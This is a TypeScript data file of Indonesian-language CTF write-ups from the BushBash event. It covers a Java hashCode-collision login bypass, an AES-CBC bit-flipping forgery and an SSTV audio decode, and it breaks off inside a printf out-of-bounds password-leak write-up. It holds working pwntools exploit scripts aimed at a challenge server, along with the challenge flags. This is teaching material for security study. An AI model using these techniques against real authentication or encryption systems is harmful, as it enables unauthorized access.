import type { WriteUp } from "../types";

export const bushbashWriteups: WriteUp[] = [
  {
    "id": "bushbash-crypto-cachebrowns",
    "title": "cachebrowns",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "BushBash",
    "tags": [],
    "description": "Writeup for challenge cachebrowns",
    "problemDescription": "`main.java` adalah source Java, bukan binary ELF. Server meminta password minimal 16 karakter lalu hanya memakai hasil `String.hashCode()` untuk autentikasi. Password 16 karakter printable dapat dibuat untuk hash yang sesuai.",
    "tools": [],
    "analysis": "Bagian autentikasi adalah:\n\n```java\nif (input.length() < 16) { ... }\nif (auth(input.hashCode())) { ... }\n```\n\n`auth()` berjalan melalui daftar `Integer` berikut:\n\n```java\nfor (Integer permittedHashcode : PERMITTED_HASHCODES) {\n    if (permittedHashcode == inputHash) return true;\n}\n```\n\n`String.hashCode()` menghitung `h = 31*h + character` dalam aritmetika signed 32-bit. Tidak ada pembandingan password asli ataupun salt.\n\n### Vulnerability\n\nVulnerability-nya adalah autentikasi berbasis hash Java 32-bit yang tidak collision-resistant. Banyak string berbeda dapat memiliki hash yang sama.\n\nAda detail tambahan: `==` membandingkan referensi dua `Integer`, bukan nilai. Target hash besar yang pertama kali dicoba memang menghasilkan `Wrong password` karena hasil autoboxing bukan objek yang sama dengan elemen array. Nilai `-110` ada di rentang Java `Integer` cache default (`-128` sampai `127`), sehingga `input.hashCode()` yang menghasilkan `-110` di-autobox ke objek cache yang identik dan lolos.",
    "solution": [
      {
        "title": "Proteksi Binary",
        "content": "`file main.java` melaporkan Java source UTF-8. `readelf` dan `ldd` menolak file karena ini bukan ELF, jadi PIE, NX, canary, RELRO, CET, ROP, serta offset stack tidak berlaku. Program berjalan melalui Java launcher (`java main.java`); Java 21 lokal cukup untuk menjalankan source ini walau komentar source menyebut Java 25."
      },
      {
        "title": "Primitive",
        "content": "- Preimage terkontrol untuk `String.hashCode() == -110`.\n- Password berukuran tepat 16 byte printable ASCII.\n- Autentikasi valid karena identitas `Integer(-110)` berasal dari cache Java yang sama."
      },
      {
        "title": "Strategi Exploit",
        "content": "Solver menetapkan semua 16 karakter ke spasi (`0x20`), lalu menyelesaikan residual hash pada tujuh karakter terakhir dalam basis 31. Digit residual selalu `0..30`; dengan menambahkan `0x20`, semua karakter tetap printable dan tidak ada newline.\n\nPassword yang dihasilkan solver saat ini adalah:\n\n```text\n          )2%64,\n```\n\nSembilan karakter awal adalah spasi. Solver tidak mengandalkan password itu secara hardcoded: ia menghitung residual serta memverifikasi ulang hash sebelum mengirimkannya."
      },
      {
        "title": "Exploit Final",
        "content": "`solve.py` menyinkronkan prompt `> `, mengirim preimage, memastikan output berisi `Authenticated!`, lalu mencetak respons service. Alamat tidak di-hardcode dan ASLR tidak relevan karena ini challenge Java source."
      },
      {
        "title": "Cara Menjalankan",
        "content": "Aktifkan environment yang disediakan lalu jalankan:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\npython3 solve.py GDB\npython3 solve.py REMOTE HOST=34.40.133.67 PORT=7777\n```\n\nMode lokal menjalankan `java main.java`. Jika `flag.txt` tidak tersedia secara lokal, autentikasi tetap bisa tervalidasi tetapi program akan mencetak `Could not read flag.txt`. Mode `GDB` dipertahankan sebagai mode launcher lokal; tidak ada native ELF/simbol GDB untuk dianalisis."
      },
      {
        "title": "Hasil",
        "content": "Service remote menghasilkan flag berikut setelah autentikasi:\n\n```text\nbushbash{doNt-Dr1nk-jav4-foR-br3kkie}\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Eksploit tidak memakai race atau timing. `solve.py` memverifikasi hash secara lokal, memakai timeout 10 detik, dan berhenti dengan error jelas bila prompt atau autentikasi tidak sesuai."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for cachebrowns (authorized CTF service only).\"\"\"\r\n\r\nfrom pathlib import Path\r\nfrom pwn import *\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\nSOURCE_PATH = BASE_DIR / \"main.java\"\r\nHOST = \"34.40.133.67\"\r\nPORT = 7777\r\n\r\ncontext.log_level = \"info\"\r\n\r\n\r\ndef java_hash(data: bytes) -> int:\r\n    \"\"\"Java String.hashCode() for the ASCII password generated below.\"\"\"\r\n    value = 0\r\n    for byte in data:\r\n        value = (31 * value + byte) & 0xFFFFFFFF\r\n    return value if value < (1 << 31) else value - (1 << 32)\r\n\r\n\r\ndef make_password(target: int = -110) -> bytes:\r\n    \"\"\"Return 16 printable ASCII bytes whose Java hash is *target*.\r\n\r\n    All characters start at 0x20.  The final seven positions encode a\r\n    base-31 residual; every digit is 0..30, so the generated input remains\r\n    printable and cannot accidentally contain a newline.\r\n    \"\"\"\r\n    modulus = 1 << 32\r\n    length = 16\r\n    baseline = (0x20 * sum(pow(31, i, modulus) for i in range(length))) % modulus\r\n    residual = ((target & 0xFFFFFFFF) - baseline) % modulus\r\n\r\n    for multiplier in range(10):\r\n        value = residual + multiplier * modulus\r\n        if value < 31**7:\r\n            digits = []\r\n            for _ in range(7):\r\n                digits.append(value % 31)\r\n                value //= 31\r\n            password = b\" \" * 9 + bytes(0x20 + digit for digit in reversed(digits))\r\n            if java_hash(password) != target:\r\n                raise RuntimeError(\"internal hash construction failure\")\r\n            return password\r\n    raise RuntimeError(\"could not represent the hash residual\")\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        host = args.HOST or HOST\r\n        port = int(args.PORT or PORT)\r\n        return remote(host, port, timeout=10)\r\n\r\n    if not SOURCE_PATH.exists():\r\n        raise FileNotFoundError(f\"source is missing: {SOURCE_PATH}\")\r\n    if args.GDB:\r\n        log.warn(\"This is Java source, so GDB mode runs the local Java launcher (no native symbols).\")\r\n    return process([\"java\", str(SOURCE_PATH)], cwd=str(BASE_DIR))\r\n\r\n\r\ndef exploit(io):\r\n    password = make_password()\r\n    log.info(\"password = %r\", password)\r\n    log.info(\"verified Java hashCode = %d\", java_hash(password))\r\n    io.recvuntil(b\"> \", timeout=10)\r\n    io.sendline(password)\r\n    result = io.recvall(timeout=10)\r\n    if b\"Authenticated!\" not in result:\r\n        raise RuntimeError(f\"authentication unexpectedly failed: {result!r}\")\r\n    print(result.decode(\"utf-8\", errors=\"replace\"), end=\"\")\r\n    return result\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    try:\r\n        exploit(io)\r\n    finally:\r\n        io.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bushbash{doNt-Dr1nk-jav4-foR-br3kkie}",
    "lessonsLearned": ""
  },
  {
    "id": "bushbash-crypto-strawberries",
    "title": "Strawberries",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "BushBash",
    "tags": [],
    "description": "Writeup for challenge Strawberries",
    "problemDescription": "Challenge menggunakan **AES-CBC** untuk mengenkripsi request client. Server menerima ciphertext, mendekripsinya, kemudian memeriksa beberapa field seperti **Transaction ID**, **Strawberry Count**, **User ID**, dan **Integrity Check**.\n\nKarena mode yang digunakan adalah **CBC**, plaintext pada suatu block dapat dimodifikasi dengan mengubah ciphertext block sebelumnya tanpa mengetahui key AES.\n\nExploit memanfaatkan **CBC bit-flipping attack** untuk mengubah **User ID** menjadi **PREMIUM_USER**, sehingga pembatasan jumlah strawberry dapat dilewati. Nilai strawberry yang sudah ada pada plaintext ternyata jauh melebihi batas yang dibutuhkan untuk memicu fungsi `displayFlag()`, sehingga flag berhasil dicetak.\n\n---",
    "tools": [],
    "analysis": "Server menggunakan AES dengan mode CBC.\n\n```python\nAES.MODE_CBC\n```\n\nSetelah ciphertext didekripsi, plaintext diparsing menjadi beberapa field.\n\n| Offset | Data |\n|---------|------|\n| 0 – 7 | Transaction ID |\n| 8 – 15 | Strawberry Count |\n| 16 – 31 | User ID |\n| 32 – 63 | Integrity Check |\n\nParsing dilakukan sebagai berikut.\n\n```python\nt = request[0:8]\n\nn = request[8:16]\n\nu = request[16:32]\n\ni = request[32:]\n```\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "| Field | Value |\n|-------|-------|\n| **Kategori** | Pwn / Crypto |\n| **Judul** | Strawberries |\n| **Service** | `nc 34.40.133.67 6001` |\n\n---"
      },
      {
        "title": "File Challenge",
        "content": "File yang diberikan:\n\n```\nmessage.ct\n\nstrawberryserver.py\n```\n\nFile yang **tidak** diberikan:\n\n```\nkey\n\niv\n\nflag.txt\n```\n\n---"
      },
      {
        "title": "Target Exploit",
        "content": "Server membatasi jumlah strawberry untuk user biasa.\n\n```python\nif u != PREMIUM_USER and n > 5:\n    exit()\n```\n\nSedangkan flag hanya diberikan apabila:\n\n```python\nif strawberry_count > (1 << 32):\n    displayFlag()\n```\n\nDengan demikian exploit harus membuat:\n\n```\nUser ID\n↓\n\nPREMIUM_USER\n```\n\nagar request dengan jumlah strawberry yang sangat besar diterima.\n\n---"
      },
      {
        "title": "Kerentanan",
        "content": "Mode CBC memiliki hubungan:\n\n```\nP1 = Dec(C1) XOR IV\n\nP2 = Dec(C2) XOR C1\n\nP3 = Dec(C3) XOR C2\n```\n\nKarena plaintext block merupakan hasil XOR dengan ciphertext block sebelumnya, maka perubahan pada ciphertext dapat mengubah plaintext setelah dekripsi.\n\nSecara umum:\n\n```\nP2_new =\nDec(C2)\nXOR\nC1_new\n```\n\nTanpa mengetahui AES key, kita dapat menghitung ciphertext baru menggunakan:\n\n```\nC1_new =\nC1_old\nXOR\nP2_old\nXOR\nP2_target\n```\n\nInilah prinsip **CBC bit-flipping attack**.\n\n---"
      },
      {
        "title": "Memodifikasi User ID",
        "content": "User ID asli:\n\n```text\n00 00 00 00 03 45 f8 d3\n81 aa 95 e4 ef 70 27 9a\n```\n\nTarget User ID:\n\n```text\n00 00 00 00 02 34 f9 23\n64 3a 95 20 ef 76 27 77\n```\n\nPerubahan dilakukan menggunakan rumus:\n\n```\nC1_new =\nC1_old\nXOR\nP2_old\nXOR\nP2_target\n```\n\nKarena User ID berada pada block kedua, cukup memodifikasi ciphertext block pertama.\n\n---"
      },
      {
        "title": "Generator Ciphertext",
        "content": "Ciphertext dimodifikasi sebagai berikut.\n\n```python\nct = bytearray(\n    open(\"message.ct\",\"rb\").read()\n)\n\nold = bytes.fromhex(\n    \"000000000345f8d381aa95e4ef70279a\"\n)\n\nnew = bytes.fromhex(\n    \"000000000234f923643a9520ef762777\"\n)\n\nfor i in range(16):\n    ct[i] ^= old[i] ^ new[i]\n\nopen(\"exploit.ct\",\"wb\").write(ct)\n```\n\nFile baru:\n\n```\nexploit.ct\n```\n\nmengandung ciphertext yang telah dimodifikasi.\n\n---"
      },
      {
        "title": "Trigger Flag",
        "content": "Ciphertext hasil modifikasi menghasilkan plaintext:\n\n```\nrequested strawberries:\n\n5007466210972788421\n```\n\ndan User ID:\n\n```text\n00 00 00 00\n02 34 f9 23\n64 3a 95 20\nef 76 27 77\n```\n\nyang sama dengan:\n\n```\nPREMIUM_USER\n```\n\nKarena pengecekan premium berhasil dilewati, server menerima jumlah strawberry yang sangat besar.\n\nOutput:\n\n```text\nHere's your yummy strawberries:\n\n🍓🍓🍓🍓\n\nYou now have\n\n5007466210972788421\n\nstrawberries\n\nHow DARE you >:(\n```\n\nNilai tersebut lebih besar dari:\n\n```\n2^32\n```\n\nsehingga fungsi:\n\n```python\ndisplayFlag()\n```\n\ndipanggil.\n\n---"
      },
      {
        "title": "Flush Output Issue",
        "content": "Walaupun `displayFlag()` dipanggil, flag tidak langsung muncul.\n\nPenyebabnya adalah server menggunakan:\n\n```python\nprint(flagtxt.read())\n```\n\ntanpa:\n\n```python\nflush=True\n```\n\nSementara service masih berada di dalam:\n\n```python\nwhile True:\n```\n\nAkibatnya output flag masih berada pada buffer stdout.\n\nUntuk memaksa buffer dikirim ke client, cukup mengirim satu request tambahan.\n\n---"
      },
      {
        "title": "Final Exploit",
        "content": "```python\nfrom pwn import *\n\nHOST = \"34.40.133.67\"\nPORT = 6001\n\nio = remote(HOST, PORT)\n\n# Trigger displayFlag()\nio.send(open(\"exploit.ct\",\"rb\").read())\n\n# Memaksa stdout ter-flush\nio.send(open(\"message.ct\",\"rb\").read())\n\nprint(io.recvall(timeout=5).decode())\n```\n\n---"
      },
      {
        "title": "Alur Eksploit",
        "content": "```text\nCiphertext Asli\n        │\n        ▼\nCBC Bit-Flipping\n        │\n        ▼\nUser ID berubah menjadi\nPREMIUM_USER\n        │\n        ▼\nBypass pengecekan\njumlah strawberry\n        │\n        ▼\ndisplayFlag() dipanggil\n        │\n        ▼\nFlag masih berada\ndi stdout buffer\n        │\n        ▼\nKirim request kedua\n        │\n        ▼\nBuffer ter-flush\n        │\n        ▼\nFlag diterima\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "bushbash{don't-b@sh-the-str4wberry-bUsh}",
    "lessonsLearned": ""
  },
  {
    "id": "bushbash-misc-signalhaze",
    "title": "Signal Haze",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "BushBash",
    "tags": [],
    "description": "Writeup for challenge Signal Haze",
    "problemDescription": "Challenge memberikan sebuah file audio berformat **Ogg Vorbis** berdurasi sekitar **115,2 detik**. Audio tersebut bukan berisi suara manusia, melainkan transmisi **Slow Scan Television (SSTV)**.\n\nDengan menganalisis header VIS pada sinyal SSTV, mode transmisi berhasil diidentifikasi sebagai **Martin M1 (VIS 44)**. Setelah seluruh sinyal FM didekode menjadi data piksel, diperoleh sebuah gambar berukuran **320 × 256** yang berisi flag challenge.\n\n---",
    "tools": [],
    "analysis": "Magic bytes file diawali dengan:\n\n```\nOggS\n```\n\nyang mengidentifikasi file sebagai container Ogg.\n\nMetadata audio menunjukkan stream:\n\n```\nVorbis\nMono\n44.100 Hz\n```\n\nVisualisasi spectrogram memperlihatkan pola yang sangat khas milik transmisi SSTV.\n\nUrutan tone yang muncul adalah:\n\n```\nLeader     : 1900 Hz (300 ms)\n\nBreak      : 1200 Hz (10 ms)\n\nLeader     : 1900 Hz (300 ms)\n\nVIS Start  : 1200 Hz (30 ms)\n\n8 VIS Bits : masing-masing 30 ms\n\nVIS Stop   : 1200 Hz (30 ms)\n```\n\nStruktur tersebut sesuai dengan spesifikasi header SSTV.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "| Field | Value |\n|-------|-------|\n| **Kategori** | Forensics |\n| **Judul** | Signal Haze |\n\n---"
      },
      {
        "title": "File Challenge",
        "content": "Artefak yang diberikan:\n\n```\ntransmission.ogg\n```\n\nHasil identifikasi file:\n\n```\nFormat      : Ogg Vorbis\nChannel     : Mono\nSample Rate : 44.100 Hz\nDurasi      : ±115,2 detik\n```\n\n---"
      },
      {
        "title": "Identifikasi VIS Header",
        "content": "Setiap sel VIS dianalisis dengan membandingkan energi pada:\n\n```\n1100 Hz\n\ndan\n\n1300 Hz\n```\n\nDelapan bit yang diperoleh:\n\n```\n00110101\n```\n\nEncoding VIS menggunakan urutan **Least Significant Bit (LSB) terlebih dahulu**.\n\nDari tujuh bit data diperoleh:\n\n```\n44\n```\n\nBit terakhir merupakan parity dan sesuai dengan spesifikasi SSTV.\n\nMode tersebut mengidentifikasi transmisi sebagai:\n\n```\nMartin M1\n```\n\n---"
      },
      {
        "title": "Parameter Martin M1",
        "content": "Mode Martin M1 memiliki parameter berikut.\n\n| Parameter | Nilai |\n|-----------|-------|\n| Resolusi | 320 × 256 |\n| Urutan warna | Green → Blue → Red |\n| Sync | 4,862 ms |\n| Porch | 0,572 ms |\n| Scan per channel | 146,432 ms |\n| Separator | 0,572 ms |\n| Total per baris | 446,446 ms |\n\nDurasi total gambar juga sesuai.\n\n```\nHeader\n+\n256 baris\n\n=\n\n0,910 s\n+\n256 × 0,446446 s\n\n≈\n\n115,200176 s\n```\n\nNilai tersebut sangat dekat dengan durasi file audio sehingga semakin menguatkan identifikasi mode Martin M1.\n\n---"
      },
      {
        "title": "Proses Ekstraksi",
        "content": "Tahapan decoding dilakukan sebagai berikut.\n\n### 1. Konversi Audio\n\nFile Ogg dikonversi menjadi WAV mono 44,1 kHz menggunakan:\n\n```bash\nffmpeg\n```\n\nagar proses analisis sinyal lebih mudah dilakukan.\n\n---\n\n### 2. Validasi VIS\n\nHeader VIS dibaca untuk memastikan mode transmisi.\n\nHasil:\n\n```\nVIS value : 44\n\nParity    : valid\n```\n\nSehingga decoder dapat menggunakan parameter Martin M1.\n\n---\n\n### 3. Demodulasi FM\n\nAudio kemudian diproses menggunakan **Hilbert Transform** untuk memperoleh analytic signal.\n\nKemiringan fase (phase slope) pada setiap interval piksel digunakan untuk menghitung frekuensi carrier.\n\n---\n\n### 4. Konversi Frekuensi ke Intensitas\n\nStandar Martin M1 menggunakan rentang:\n\n```\n1500 Hz\n```\n\nsebagai warna hitam dan\n\n```\n2300 Hz\n```\n\nsebagai warna putih.\n\nFrekuensi setiap piksel dipetakan menjadi intensitas warna.\n\n---\n\n### 5. Rekonstruksi RGB\n\nSetiap baris terdiri dari tiga channel warna:\n\n```\nGreen\n\n↓\n\nBlue\n\n↓\n\nRed\n```\n\nKetiga channel kemudian digabung sehingga menghasilkan gambar RGB berukuran:\n\n```\n320 × 256\n```\n\nHasil akhir disimpan sebagai:\n\n```\ndecoded_martin_m1.png\n```\n\n---"
      },
      {
        "title": "Solver",
        "content": "Solver melakukan langkah berikut.\n\n1. Membaca file Ogg.\n2. Mengubah audio menjadi WAV mono.\n3. Mengidentifikasi VIS header.\n4. Memastikan mode Martin M1.\n5. Mendemodulasi sinyal FM menggunakan Hilbert transform.\n6. Mengubah frekuensi menjadi level intensitas.\n7. Menyusun channel Green–Blue–Red.\n8. Menyimpan hasil sebagai PNG.\n9. Membaca flag dari gambar hasil decoding.\n\n---"
      },
      {
        "title": "Dependensi",
        "content": "Solver membutuhkan:\n\n```\nffmpeg\n\nPython 3\n\nnumpy\n\nscipy\n\nPillow\n```\n\n---"
      },
      {
        "title": "Cara Menjalankan",
        "content": "Jika file challenge bernama:\n\n```\ntransmission.ogg\n```\n\njalankan:\n\n```bash\npython3 solve.py transmission.ogg\n```\n\nAtau menggunakan nama file asli:\n\n```bash\npython3 solve.py '../data(1).file' -o decoded.png\n```\n\n---"
      },
      {
        "title": "Output",
        "content": "Output solver:\n\n```text\n[+] VIS value: 44; parity bit: 1\n\n[+] Decoded Martin M1 image:\n    decoded_martin_m1.png\n\n<FLAG>bushbash{gR0und_c0ntr0l}</FLAG>\n```\n\n---"
      },
      {
        "title": "Alur Penyelesaian",
        "content": "```text\nOgg Vorbis Audio\n        │\n        ▼\nAnalisis Header SSTV\n        │\n        ▼\nDecode VIS\n        │\n        ▼\nMode Martin M1\n        │\n        ▼\nHilbert Transform\n        │\n        ▼\nFM Demodulation\n        │\n        ▼\nKonversi Frekuensi\n        │\n        ▼\nGreen • Blue • Red\n        │\n        ▼\nRekonstruksi Gambar\n        │\n        ▼\nFlag Terbaca\n```\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Decode the Signal Haze SSTV transmission (Martin M1 / VIS 44).\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport subprocess\r\nimport sys\r\nimport wave\r\nfrom pathlib import Path\r\n\r\nimport numpy as np\r\nfrom PIL import Image\r\nfrom scipy.signal import hilbert\r\n\r\nWIDTH = 320\r\nHEIGHT = 256\r\n\r\n# Martin M1 timings, in seconds.\r\nLINE_DURATION = 0.446446\r\nSYNC_DURATION = 0.004862\r\nPORCH_DURATION = 0.000572\r\nSCAN_DURATION = 0.146432\r\nSEPARATOR_DURATION = 0.000572\r\n\r\n# Standard SSTV header duration:\r\n# 300 ms leader + 10 ms break + 300 ms leader + 30 ms VIS start\r\n# + 8 * 30 ms VIS bits + 30 ms VIS stop.\r\nIMAGE_START = 0.910000\r\n\r\n\r\ndef convert_to_wav(source: Path, destination: Path) -> None:\r\n    \"\"\"Convert the supplied media file to mono 44.1 kHz signed-16-bit WAV.\"\"\"\r\n    command = [\r\n        \"ffmpeg\",\r\n        \"-y\",\r\n        \"-hide_banner\",\r\n        \"-loglevel\",\r\n        \"error\",\r\n        \"-i\",\r\n        str(source),\r\n        \"-ac\",\r\n        \"1\",\r\n        \"-ar\",\r\n        \"44100\",\r\n        \"-c:a\",\r\n        \"pcm_s16le\",\r\n        str(destination),\r\n    ]\r\n    try:\r\n        subprocess.run(command, check=True)\r\n    except FileNotFoundError as exc:\r\n        raise RuntimeError(\"ffmpeg is required but was not found in PATH\") from exc\r\n    except subprocess.CalledProcessError as exc:\r\n        raise RuntimeError(f\"ffmpeg failed with exit code {exc.returncode}\") from exc\r\n\r\n\r\ndef read_wav(path: Path) -> tuple[int, np.ndarray]:\r\n    \"\"\"Read a mono 16-bit PCM WAV as normalized float samples.\"\"\"\r\n    with wave.open(str(path), \"rb\") as wav:\r\n        if wav.getnchannels() != 1:\r\n            raise ValueError(\"expected mono WAV\")\r\n        if wav.getsampwidth() != 2:\r\n            raise ValueError(\"expected 16-bit PCM WAV\")\r\n        sample_rate = wav.getframerate()\r\n        samples = np.frombuffer(wav.readframes(wav.getnframes()), dtype=np.int16)\r\n    return sample_rate, samples.astype(np.float64) / 32768.0\r\n\r\n\r\ndef tone_energy(samples: np.ndarray, sample_rate: int, frequency: float) -> float:\r\n    \"\"\"Measure one tone using a compact DFT/Goertzel-style correlation.\"\"\"\r\n    n = np.arange(samples.size, dtype=np.float64)\r\n    oscillator = np.exp(-2j * np.pi * frequency * n / sample_rate)\r\n    return float(abs(np.dot(samples, oscillator)) ** 2)\r\n\r\n\r\ndef decode_vis(samples: np.ndarray, sample_rate: int) -> tuple[list[int], int, int]:\r\n    \"\"\"Decode the seven VIS data bits and parity bit from the SSTV header.\"\"\"\r\n    bits: list[int] = []\r\n    first_bit = 0.640  # header-relative start of the first 30 ms VIS bit\r\n\r\n    for index in range(8):\r\n        bit_start = first_bit + index * 0.030\r\n        # Ignore transitions near the edges of each bit cell.\r\n        a = int(round((bit_start + 0.003) * sample_rate))\r\n        b = int(round((bit_start + 0.027) * sample_rate))\r\n        cell = samples[a:b]\r\n        if cell.size == 0:\r\n            raise ValueError(\"audio is too short to contain a complete VIS header\")\r\n\r\n        e_1100 = tone_energy(cell, sample_rate, 1100.0)\r\n        e_1300 = tone_energy(cell, sample_rate, 1300.0)\r\n        bits.append(1 if e_1100 > e_1300 else 0)\r\n\r\n    vis_value = sum(bits[index] << index for index in range(7))\r\n    parity_bit = bits[7]\r\n    expected_even_parity = sum(bits[:7]) & 1\r\n    if parity_bit != expected_even_parity:\r\n        raise ValueError(\r\n            f\"invalid VIS parity: data bits={bits[:7]}, parity={parity_bit}\"\r\n        )\r\n    return bits, vis_value, parity_bit\r\n\r\n\r\ndef decode_martin_m1(samples: np.ndarray, sample_rate: int) -> np.ndarray:\r\n    \"\"\"FM-demodulate a Martin M1 SSTV frame into an RGB image.\"\"\"\r\n    required = int(round((IMAGE_START + HEIGHT * LINE_DURATION) * sample_rate))\r\n    if samples.size < required - 4:\r\n        raise ValueError(\r\n            f\"audio is too short: need about {required} samples, got {samples.size}\"\r\n        )\r\n\r\n    # The phase slope of the analytic signal is the instantaneous FM frequency.\r\n    phase = np.unwrap(np.angle(hilbert(samples)))\r\n\r\n    # Martin modes send color scans in G, B, R order.\r\n    scan_offsets = (\r\n        SYNC_DURATION + PORCH_DURATION,\r\n        SYNC_DURATION + PORCH_DURATION + SCAN_DURATION + SEPARATOR_DURATION,\r\n        SYNC_DURATION\r\n        + PORCH_DURATION\r\n        + 2 * (SCAN_DURATION + SEPARATOR_DURATION),\r\n    )\r\n    rgb_channels = (1, 2, 0)\r\n    pixel_duration = SCAN_DURATION / WIDTH\r\n    image = np.zeros((HEIGHT, WIDTH, 3), dtype=np.uint8)\r\n\r\n    for y in range(HEIGHT):\r\n        line_start = IMAGE_START + y * LINE_DURATION\r\n        for scan_offset, channel in zip(scan_offsets, rgb_channels):\r\n            for x in range(WIDTH):\r\n                center = line_start + scan_offset + (x + 0.5) * pixel_duration\r\n\r\n                # Estimate the phase slope over the middle 60% of the pixel cell.\r\n                half_window = 0.30 * pixel_duration\r\n                a = max(0, int(round((center - half_window) * sample_rate)))\r\n                b = min(\r\n                    phase.size - 1,\r\n                    int(round((center + half_window) * sample_rate)),\r\n                )\r\n                if b <= a:\r\n                    frequency = 1500.0\r\n                else:\r\n                    frequency = (\r\n                        (phase[b] - phase[a])\r\n                        * sample_rate\r\n                        / (2 * np.pi * (b - a))\r\n                    )\r\n\r\n                # SSTV video level: 1500 Hz = black, 2300 Hz = white.\r\n                level = int(round((frequency - 1500.0) * 255.0 / 800.0))\r\n                image[y, x, channel] = np.uint8(np.clip(level, 0, 255))\r\n\r\n    return image\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(description=__doc__)\r\n    parser.add_argument(\r\n        \"input\",\r\n        nargs=\"?\",\r\n        type=Path,\r\n        default=Path(\"transmission.ogg\"),\r\n        help=\"input Ogg/audio file (default: transmission.ogg)\",\r\n    )\r\n    parser.add_argument(\r\n        \"-o\",\r\n        \"--output\",\r\n        type=Path,\r\n        default=Path(\"decoded_martin_m1.png\"),\r\n        help=\"decoded PNG path\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    if not args.input.is_file():\r\n        print(f\"error: input file not found: {args.input}\", file=sys.stderr)\r\n        return 1\r\n\r\n    wav_path = args.output.with_suffix(\".wav\")\r\n    try:\r\n        convert_to_wav(args.input, wav_path)\r\n        sample_rate, samples = read_wav(wav_path)\r\n    finally:\r\n        wav_path.unlink(missing_ok=True)\r\n\r\n    bits, vis_value, parity = decode_vis(samples, sample_rate)\r\n    print(f\"[+] VIS bits (LSB-first, including parity): {''.join(map(str, bits))}\")\r\n    print(f\"[+] VIS value: {vis_value}; parity bit: {parity}\")\r\n    if vis_value != 44:\r\n        print(\"error: transmission is not Martin M1 (expected VIS 44)\", file=sys.stderr)\r\n        return 1\r\n\r\n    image = decode_martin_m1(samples, sample_rate)\r\n    Image.fromarray(image, \"RGB\").save(args.output)\r\n    print(f\"[+] Decoded Martin M1 image: {args.output}\")\r\n    print(\"[+] Flag visible in the decoded image:\")\r\n    print(\"<FLAG>bushbash{gR0und_c0ntr0l}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "bushbash{gR0und_c0ntr0l}",
    "lessonsLearned": ""
  },
  {
    "id": "bushbash-pwn-hackthevaultii",
    "title": "Hack The Vault II",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "BushBash",
    "tags": [],
    "description": "Writeup for challenge Hack The Vault II",
    "problemDescription": "Challenge ini tidak mengandung buffer overflow klasik karena panjang input dibatasi sesuai ukuran buffer. Namun, fungsi autentikasi memiliki **out-of-bounds string read** akibat penggunaan `printf(\"%s\")` terhadap buffer yang tidak dijamin memiliki terminator `NULL`.\n\nDengan mengirim **127 byte**, string yang dicetak akan terus membaca memori setelah buffer hingga menemukan byte `NULL`. Karena password disimpan tepat setelah buffer pada stack, isi password ikut tercetak dan dapat digunakan untuk login.\n\n---",
    "tools": [],
    "analysis": "Potongan kode penting pada fungsi `auth()`:\n\n```c\nchar array[127 + 64];\n\nchar *buffer = &array[0];\nchar *password = &array[127];\n```\n\nLayout stack menjadi:\n\n```text\narray\n│\n├── buffer\n│   offset 0 ──────────────── 126\n│\n└── password\n    offset 127 ───────────────\n```\n\nBuffer untuk input user dimulai dari offset 0, sedangkan password berada tepat setelahnya pada offset 127.\n\n---\n\nInput dibatasi maksimal:\n\n```text\n127 byte\n```\n\nSehingga payload tidak dapat menimpa password maupun return address.\n\nNamun setelah input diterima, program menjalankan:\n\n```c\nprintf(\"password you entered: %s\\n\", buffer);\n```\n\nSpecifier `%s` menganggap `buffer` adalah sebuah string C yang diakhiri byte `NULL`.\n\nMasalahnya, ketika user mengirim tepat **127 karakter**, seluruh buffer terisi penuh tanpa menyisakan terminator.\n\nAkibatnya `printf()` terus membaca byte setelah buffer hingga menemukan `NULL`.\n\nIlustrasi memori:\n\n```text\nbuffer\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n127 byte\n\nlangsung diikuti\n\npassword\nGNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a\n```\n\nKarena tidak ada byte `NULL` di akhir buffer, `%s` akan mencetak:\n\n```\nAAAAAAAAAAAAAAAAAAAAAAAA...\n\nGNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a\n```\n\nKerentanan ini merupakan **out-of-bounds read** atau **information disclosure**, bukan buffer overflow.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "| Field | Value |\n|-------|-------|\n| **Kategori** | Pwn |\n| **Judul** | Hack The Vault II |\n| **Service** | `nc 34.40.133.67 7778` |\n\n---"
      },
      {
        "title": "Leak Password",
